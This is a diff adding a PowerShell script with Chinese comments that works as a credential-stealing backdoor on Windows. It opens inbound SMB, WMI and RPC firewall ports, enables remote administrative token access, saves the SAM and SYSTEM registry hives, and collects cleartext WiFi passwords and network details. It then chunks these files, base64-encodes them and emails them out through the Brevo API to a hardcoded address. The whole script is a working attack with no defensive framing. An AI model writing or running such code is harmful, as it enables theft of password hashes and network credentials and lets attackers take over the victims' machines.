@@ -1,0 +1,87 @@
+New-NetFirewallRule -DisplayName "Allow SMB Inbound" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445
+New-NetFirewallRule -DisplayName "Allow WMI Inbound" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 135
+New-NetFirewallRule -DisplayName "Allow RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 49152-65535
+
+# 加入機馬
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
+
+reg save HKLM\SAM c:\windows\temp\sam.hiv
+reg save HKLM\SYSTEM c:\windows\temp\system.hiv
+# 網路密碼
+# 1. 檢查是否有 WiFi 設定檔
+try {
+    $profiles = (netsh wlan show profiles | Select-String "Profile|設定檔" | ForEach-Object { $_.ToString().Split(':')[-1].Trim() } | Where-Object { $_ -ne "" })
+} catch {
+    $profiles = $null
+}
+
+$results = New-Object System.Collections.Generic.List[string]
+
+if ($profiles) {
+    foreach ($name in $profiles) {
+        $raw = netsh wlan show profile name="$name" key=clear
+        $pass = ($raw | Select-String "Key Content|關鍵內容" | ForEach-Object { $_.ToString().Split(':')[-1].Trim() })
+        if ($pass) { $results.Add("WiFi: $name | Password: $pass") } else { $results.Add("WiFi: $name | Password: (Open/Enterprise)") }
+    }
+} else {
+    $results.Add("狀態: 找不到無線網路設定檔，改為抓取網卡資訊。")
+}
+
+# 2. 額外抓取乙太網路/所有網卡的資訊
+$results.Add("--- 網卡詳細資訊 ---")
+$results.Add((ipconfig /all | Out-String))
+
+$results | Out-File -FilePath "C:\Windows\Temp\wifi.txt" -Encoding utf8
+
+
+
+
+
+# $api_key = "..."
+$SENDER  = "qwerkerswim@outlook.com"
+$files   = @("c:\windows\temp\sam.hiv", "c:\windows\temp\system.hiv", "c:\windows\temp\wifi.txt")
+$chunkSize = 1MB
+
+foreach ($sourcePath in $files) {
+    if (!(Test-Path $sourcePath)) { continue } # 沒檔案就跳過
+
+    Write-Host ">>> 正在處理: $sourcePath" -ForegroundColor Yellow
+    $dir      = [System.IO.Path]::GetDirectoryName($sourcePath)
+    $fileName = [System.IO.Path]::GetFileName($sourcePath)
+    $index    = 0
+    $inputStream = [System.IO.File]::OpenRead($sourcePath)
+
+    try {
+        $buffer = New-Object byte[] $chunkSize
+        while (($bytesRead = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+            # 建立分段檔
+            $suffix = "_part{0:D3}.dat.txt" -f $index
+            $outputPath = Join-Path $dir ($fileName + $suffix)
+            # 寫入並立即關閉分段檔串流
+            $outStream = [System.IO.File]::OpenWrite($outputPath)
+            $outStream.Write($buffer, 0, $bytesRead)
+            $outStream.Close()
+
+            # 傳送郵件 (加入 -TimeoutSec 避免網路卡死)
+            $FileBytes = [System.IO.File]::ReadAllBytes($outputPath)
+            $FileContent = [Convert]::ToBase64String($FileBytes)
+            $Body = @{
+                sender = @{email=$SENDER}; to = @(@{email=$SENDER})
+                subject = "終端機傳送：$($outputPath | Split-Path -Leaf)"
+                textContent = "自動傳送"; attachment = @(@{content=$FileContent; name=($outputPath | Split-Path -Leaf)})
+            } | ConvertTo-Json -Depth 10
+            Invoke-RestMethod -Uri "https://api.brevo.com/v3/smtp/email" -Method Post -Headers @{"api-key"=$api_key; "content-type"="application/json"} -Body $Body
+
+            Write-Host "已傳送: $outputPath"
+            $index++
+        }
+        Write-Host "✅ $fileName 分割完成！" -ForegroundColor Green
+    } 
+    finally {
+        # 關鍵：每一段處理完都要立刻關閉
+        if ($null -ne $inputStream) {
+            $inputStream.Close()
+            $inputStream.Dispose()
+        }
+    }
+}
